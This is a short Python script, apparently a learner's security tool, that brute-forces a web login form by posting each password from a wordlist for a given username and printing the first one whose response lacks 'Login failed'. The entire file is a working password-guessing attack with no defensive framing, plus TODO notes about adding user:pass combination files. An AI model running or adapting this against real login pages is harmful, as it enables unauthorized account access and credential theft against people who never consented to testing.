# Currently accepts single username input and password file
# TODO: create username file reading to test username line with password file logging output
# also include an option for user:pass files separated by ':'
#
#!/usr/bin/env python

import requests
import argparse

# Get necessary args
def getArgs():
    parser = argparse.ArgumentParser()  # argparse intialize

    # Obtain target range to scan
    parser.add_argument(
      "-t",
      "--target",
      dest="target",
      help="Target URL to spider")

    parser.add_argument(
      "-u",
      "--user",
      dest="user",
      help="Username")

    parser.add_argument(
        "-w",
        "--wordlist",
        dest="wordlist",
        help="Wordlist to use")
    options = parser.parse_args()

    # verify arguments
    if not options.target:
        parser.error("[-] No URL provided. See --help for more info")
    elif not options.user:
        parser.error("[-] No user provided. See --help for more info")
    elif not options.wordlist:
        parser.error("[-] No wordlist provided. See --help for more info")
    else:
        return options


options = getArgs()
target = options.target
wordlist = options.wordlist
username = options.user
data_dict = {"username": username, "password": "", "Login": "submit"}

with open(wordlist, "r") as wordlist:
  for line in wordlist:
    word = line.strip()
    data_dict["password"] = word
    response = requests.post(target, data=data_dict)
    if "Login failed" not in response.content:
      print("[+] Login found --> " + word)
      exit()

print("[-] End of file reached - no password found")
